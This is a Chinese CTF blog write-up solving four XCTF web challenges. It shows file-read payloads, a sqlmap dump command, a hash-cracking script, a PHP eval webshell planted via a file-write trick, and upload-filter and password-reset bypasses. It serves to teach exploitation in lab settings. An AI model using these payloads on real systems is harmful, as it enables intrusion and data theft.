@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -write up -ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 继续滚回来刷攻防世界了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界3">
+<meta property="og:url" content="http://example.com/2022/04/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C3/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 继续滚回来刷攻防世界了。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/04/19/nIkVUpNoiwLDQF6.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/19/J9wvBb7Dtx6dnQF.png">
+<meta property="article:published_time" content="2022-04-19T12:59:13.000Z">
+<meta property="article:modified_time" content="2022-04-21T14:20:19.148Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -write up -ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/19/nIkVUpNoiwLDQF6.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/04/19/攻防世界3/"/>
+
+
+
+
+
+  <title>攻防世界3 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">攻防世界3</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-04-19T20:59:13+08:00">
+                2022-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>继续滚回来刷攻防世界了。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h1><p>这题考的点完美踩在我的遗忘点上，赶紧记一波。首先进入网页是一个比较熟悉的ping功能，猜测rce，但是发现有waf，对rce命令进行fuzz发现完全无法执行，因此考点不是rce。</p>
+<p>文件穿梭也不对，ssrf也不对，因此这题上来就卡住了。求助万能的wp，首先我们在url参数中传入<code>%80</code>或者以后的ascii字符，可以得到Django报错页面的html码，结合报错原因应该是因为ascii编码不支持导致的。</p>
+<p>这里就要想到在php中可以利用<code>@</code>进行任意文件读取，比如读取index.php:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@index.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/04/19/nIkVUpNoiwLDQF6.png"></p>
+<p>既然存在任意文件读取那就简单了，我们可以考虑猜测flag位置或者查看配置文件，这种题根目录和网页根目录没有flag的话多半得去配置文件找，那么这题要找python的配置文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/api/settings.py</span><br></pre></td></tr></table></figure>
+<p>获取数据库名database.sqlite3，读取数据库内容即可找到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>
+
+<h1 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h1><p>也是相当有难度的一题，首先进去好像只有几个pdf文件能下载，干不了啥别的事，那么常规信息搜集一下，发现<code>robots.txt</code>，隐藏了<code>login.php</code>和<code>admin.php</code>，依次查看。</p>
+<p><code>admin.php</code>中源码直接写道不可能bypass，fuzz了下发现确实bypass不了，那么把目光放在<code>login.php</code>上。查看源码发现让我们GET一个debug参数进去，传入后发现后端源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#x27;usr&#x27;]) &amp;&amp; isset($_POST[&#x27;pw&#x27;]))&#123;</span><br><span class="line">        $user = $_POST[&#x27;usr&#x27;];</span><br><span class="line">        $pass = $_POST[&#x27;pw&#x27;];</span><br><span class="line"></span><br><span class="line">        $db = new SQLite3(&#x27;../fancy.db&#x27;);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(&quot;SELECT id,name from Users where name=&#x27;&quot;.$user.&quot;&#x27; and password=&#x27;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#x27;&quot;);</span><br><span class="line">    if($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;br&gt;Some Error occourred!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($row[&#x27;id&#x27;]))&#123;</span><br><span class="line">            setcookie(&#x27;name&#x27;,&#x27; &#x27;.$row[&#x27;name&#x27;], time() + 60, &#x27;/&#x27;);</span><br><span class="line">            header(&quot;Location: /&quot;);</span><br><span class="line">            die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;debug&#x27;]))</span><br><span class="line">highlight_file(&#x27;login.php&#x27;);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>锁定注入点为usr参数，数据库类型为sqlite，试了下没加waf，那直接sqlmap一把嗦：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 1.txt --risk 3 --level 5 --dump-all --batch</span><br></pre></td></tr></table></figure>
+<p>再挖个坑，之后写篇关于sqlite的博客吧，结果：<br><img src="https://s2.loli.net/2022/04/19/J9wvBb7Dtx6dnQF.png"></p>
+<p>我们发现了admin的密码，但是这时加密过的，源码也告诉我们加密逻辑是<code>sha1($password.&quot;Salz!&quot;)</code>，而根据hint的内容，估计密码就存在论文中，那我们就把论文中的每一个词都试一遍，简单来说就是爆破（，这个exp真的不会写，扒一个吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import hashlib</span><br><span class="line">from pdfminer.pdfparser import PDFParser</span><br><span class="line">from pdfminer.pdfdocument import PDFDocument</span><br><span class="line">from pdfminer.pdfpage import PDFPage</span><br><span class="line">from pdfminer.pdfpage import PDFTextExtractionNotAllowed</span><br><span class="line">from pdfminer.pdfinterp import PDFResourceManager</span><br><span class="line">from pdfminer.pdfinterp import PDFPageInterpreter</span><br><span class="line">from pdfminer.layout import *</span><br><span class="line">from pdfminer.converter import PDFPageAggregator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 将pdf转换为txt的函数</span><br><span class="line">def pdf2txt(path):</span><br><span class="line">    # 打开PDF文件</span><br><span class="line">    pdfFile = open(path, &#x27;rb&#x27;)</span><br><span class="line"></span><br><span class="line">    # 创建pdf文档分析器</span><br><span class="line">    parser = PDFParser(pdfFile)</span><br><span class="line"></span><br><span class="line">    # 创建PDF文档对象存储文档结构</span><br><span class="line">    document = PDFDocument(parser)</span><br><span class="line"></span><br><span class="line">    # 检查文件是否允许文本提取</span><br><span class="line">    if not document.is_extractable:</span><br><span class="line">        raise PDFTextExtractionNotAllowed</span><br><span class="line"></span><br><span class="line">    # 创建PDF资源管理器对象来存储共享资源</span><br><span class="line">    resource = PDFResourceManager()</span><br><span class="line"></span><br><span class="line">    # 设定参数进行分析</span><br><span class="line">    laparams = LAParams()</span><br><span class="line"></span><br><span class="line">    # 创建一个PDF设备对象</span><br><span class="line">    device = PDFPageAggregator(resource, laparams=laparams)</span><br><span class="line"></span><br><span class="line">    # 创建一个PDF解释器对象</span><br><span class="line">    interpreter = PDFPageInterpreter(resource,device)</span><br><span class="line"></span><br><span class="line">    # 创建存储转换结果的同名txt文件</span><br><span class="line">    fileName = str(path.split(&quot;.&quot;)[0])</span><br><span class="line">    newFileName = fileName + &quot;.txt&quot;</span><br><span class="line">    f = open(newFileName, &quot;w&quot;)</span><br><span class="line"></span><br><span class="line">    # 处理每一页</span><br><span class="line">    for page in PDFPage.create_pages(document):</span><br><span class="line">        interpreter.process_page(page)</span><br><span class="line">        # 接受该页面的LTPage对象</span><br><span class="line">        layout = device.get_result()</span><br><span class="line">        for x in layout:</span><br><span class="line">            if (isinstance(x, LTTextBoxHorizontal)):</span><br><span class="line">                # 写入txt文件</span><br><span class="line">                try:</span><br><span class="line">                    f.writelines(x.get_text() + &quot;\n&quot;)</span><br><span class="line">                except:</span><br><span class="line">                    pass</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"># 下载所有pdf文件的函数</span><br><span class="line">def downloadpdf():</span><br><span class="line">    pdfUrl = []  # 存放所有pdf文件的连接</span><br><span class="line">    # 爬取所有的pdf文件的连接</span><br><span class="line">    urlList = [</span><br><span class="line">        &quot;http://111.200.241.244:49530/&quot;,</span><br><span class="line">        &quot;http://111.200.241.244:49530/1/index.html&quot;,</span><br><span class="line">        &quot;http://111.200.241.244:49530/1/2/index.html&quot;,</span><br><span class="line">        &quot;http://111.200.241.244:49530/1/2/4/index.html&quot;,</span><br><span class="line">        &quot;http://111.200.241.244:49530/1/2/5/index.html&quot;,</span><br><span class="line">        &quot;http://111.200.241.244:49530/1/3/index.html&quot;,</span><br><span class="line">        &quot;http://111.200.241.244:49530/1/3/6/index.html&quot;,</span><br><span class="line">        &quot;http://111.200.241.244:49530/1/3/7/index.html&quot;,</span><br><span class="line">        &quot;http://111.200.241.244:49530/1/3/7/8/index.html&quot;</span><br><span class="line">        ]</span><br><span class="line">    for each in urlList:</span><br><span class="line">        r = requests.get(url=each)</span><br><span class="line">        soup = BeautifulSoup(r.text, &#x27;lxml&#x27;)</span><br><span class="line">        result = soup.find_all(name=&quot;a&quot;, attrs=&#123;&quot;title&quot;:&quot;my very fav paper&quot;&#125;)</span><br><span class="line">        for tmp in result:</span><br><span class="line">            if tmp[&quot;href&quot;].endswith(&quot;.pdf&quot;):</span><br><span class="line">                pdfUrl.append(each.split(&quot;index.html&quot;)[0] + tmp[&quot;href&quot;])</span><br><span class="line"></span><br><span class="line">    # 使用curl -O 命令下载pdf文件</span><br><span class="line">    for each in pdfUrl:</span><br><span class="line">        os.system(&quot;curl -O &quot; + each)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 取hash值的函数</span><br><span class="line">def sha1(msg):</span><br><span class="line">    sha1 = hashlib.sha1()</span><br><span class="line">    sha1.update((msg + &quot;Salz!&quot;).encode(&quot;utf-8&quot;))</span><br><span class="line">    return sha1.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 破解密码的函数</span><br><span class="line">def getpassword():</span><br><span class="line">    passlist = &#123;</span><br><span class="line">        &quot;3fab54a50e770d830c0416df817567662a9dc85c&quot;:&quot;admin&quot;,</span><br><span class="line">        &quot;54eae8935c90f467427f05e4ece82cf569f89507&quot;:&quot;fritze&quot;,</span><br><span class="line">        &quot;34b0bb7c304949f9ff2fc101eef0f048be10d3bd&quot;:&quot;hansi&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    for each in os.listdir(os.curdir):</span><br><span class="line">        # 取出txt文件</span><br><span class="line">        if each.endswith(&quot;.txt&quot;):</span><br><span class="line">            with open(each, &quot;r&quot;) as file:</span><br><span class="line">                a = file.read()</span><br><span class="line">                b = re.split(r&quot;[\s\,\;\.]+&quot;, a)  # 将单词分割出来</span><br><span class="line">                c = []</span><br><span class="line">                tmp = &quot;&quot;</span><br><span class="line">                judge = False</span><br><span class="line">                # 处理以-结尾的行，最终的结果保存在c中</span><br><span class="line">                for each in b:</span><br><span class="line">                    if each.endswith(&quot;-&quot;):</span><br><span class="line">                        tmp = each.split(&quot;-&quot;)[0]</span><br><span class="line">                        judge = True</span><br><span class="line">                    elif judge:</span><br><span class="line">                        c.append(tmp + each)</span><br><span class="line">                        judge = False</span><br><span class="line">                    else:</span><br><span class="line">                        c.append(each)</span><br><span class="line">                # 遍历c碰撞得到密码</span><br><span class="line">                for each in c:</span><br><span class="line">                    print(each)</span><br><span class="line">                    if sha1(each) in passlist:</span><br><span class="line">                        return &quot;----&quot; + passlist[sha1(each)] + &quot;&#x27;s password is &quot; + each + &quot;Salz!&quot; + &quot;----&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    os.chdir(os.curdir + os.sep + &quot;pdfdir&quot;)  # 修改工作目录</span><br><span class="line">    downloadpdf()  # 下载pdf文件</span><br><span class="line"></span><br><span class="line">    # 将所有pdf文件转换成txt文件</span><br><span class="line">    for each in os.listdir(os.curdir):</span><br><span class="line">        pdf2txt(each)</span><br><span class="line"></span><br><span class="line">    # 遍历所有的txt文件得到密码</span><br><span class="line">    password = getpassword()</span><br><span class="line">    return password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>跑出来密码为ThinJerboa，登录获得flag。</p>
+<h1 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h1><p>小做一手工控，这次的考点在项目管理一栏中。进入网页审查元素发现存在<code>view-source.php</code>，访问一波，审计代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    if (!isset($_GET[page])) &#123;</span><br><span class="line">      show_source(__FILE__);</span><br><span class="line">      die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($_GET[page]) &amp;&amp; $_GET[page] != &#x27;index.php&#x27;) &#123;</span><br><span class="line">      include(&#x27;flag.php&#x27;);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">      header(&#x27;Location: ?page=flag.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">     if ($_SESSION[&#x27;admin&#x27;]) &#123;</span><br><span class="line">       $con = $_POST[&#x27;con&#x27;];</span><br><span class="line">       $file = $_POST[&#x27;file&#x27;];</span><br><span class="line">       $filename = &quot;backup/&quot;.$file;</span><br><span class="line"></span><br><span class="line">       if(preg_match(&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;, $filename))&#123;</span><br><span class="line">          die(&quot;Bad file extension&quot;);</span><br><span class="line">       &#125;else&#123;</span><br><span class="line">            chdir(&#x27;uploaded&#x27;);</span><br><span class="line">           $f = fopen($filename, &#x27;w&#x27;);</span><br><span class="line">           fwrite($f, $con);</span><br><span class="line">           fclose($f);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">      if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#x27;1&#x27; &amp;&amp; substr($_GET[id], -1) === &#x27;9&#x27;) &#123;</span><br><span class="line">        include &#x27;config.php&#x27;;</span><br><span class="line">        $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">        $sql=&quot;select * from cetc007.user where id=&#x27;$id&#x27;&quot;;</span><br><span class="line">        $result = mysql_query($sql);</span><br><span class="line">        $result = mysql_fetch_object($result);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        $result = False;</span><br><span class="line">        die();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;);</span><br><span class="line">      if($result)&#123;</span><br><span class="line">        echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        $_SESSION[&#x27;admin&#x27;] = True;</span><br><span class="line">      &#125;</span><br><span class="line">     ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>三段代码，第一段代码的意思是如果page的值不为空且page不为<code>index.php</code>，就会包含<code>flag.php</code>，否则就会直接重定向page为<code>flag.php</code>。</p>
+<p>第二段代码是文件写入，但是存在waf，并且要求$_SESSION[‘admin’]为true，则段代码应该是最后来看的。</p>
+<p>第三段代码总的来说就是要GET一个id参数，这个参数的浮点数不能为1，且id的最后一位必须得是9，这样才能进行sql查询。特别要注意，在浮点数那里的比较中用的是强类型比较，因此不能用数字绕。</p>
+<p>我们针对第三段代码先构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=flag.php&amp;id=1a9</span><br></pre></td></tr></table></figure>
+
+<p>可以看到页面上出现了<code>name:admin</code>，因此我们的session被置为了true，接下来就是写文件的部分了。</p>
+<p>这里的waf主要是禁用了文件后缀，后缀不能为<code>php``php3/4/5/7``pht``phtml</code>，如果没有检测到，则把文件写入并保存在<code>/uploaded/backup/filename</code>中。</p>
+<p>那么这里要用到一个很经典的apache文件解析漏洞，apache解析文件时从最右边开始解析，如果不是一个有效的后缀则会向左继续匹配，如果我们上传一个<code>shell.php.xxx</code>文件的话，apache就会把它解析成<code>shell.php</code>文件。</p>
+<p>但是尝试getshell发现失败了，猜测是我们在这个文件夹中没有操作权限，因此我们把php文件写入父目录中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con=&lt;?php @eval($_POST[&#x27;mrl64&#x27;]);?&gt;&amp;file=../shell.php/.</span><br></pre></td></tr></table></figure>
+
+<p>因此文件写在了<code>/uploaded</code>中，访问即可getshell，flag在网页目录下。</p>
+<h1 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h1><p>进入网页告诉我们要登录，然后跳转到登录页面，可以注册和找回密码，fuzz发现不存在sql注入，那么注册登录进行查看。</p>
+<p>登陆成功后发现熟悉的笑脸：），点击可选菜单发现Manage需要是admin才能使用。猜测在忘记密码部分存在逻辑漏洞，因此尝试改密，用自己的信息绕过密保，接着在step1输入新密码，抓包获取step2更改username，改密成功，登录admin。</p>
+<p>接下来发现ip限制，XFF即可，进入后审查元素发现提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?module=filemanage&amp;do=???</span><br></pre></td></tr></table></figure>
+
+<p>猜测do的内容为upload，访问后出现文件上传，简单的upload绕过，用<code>.php5</code>绕过后缀检测，js标签绕过php标签检测，上传成功即可获取flag。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-write-up-ctf/" rel="tag"># -web -write up -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
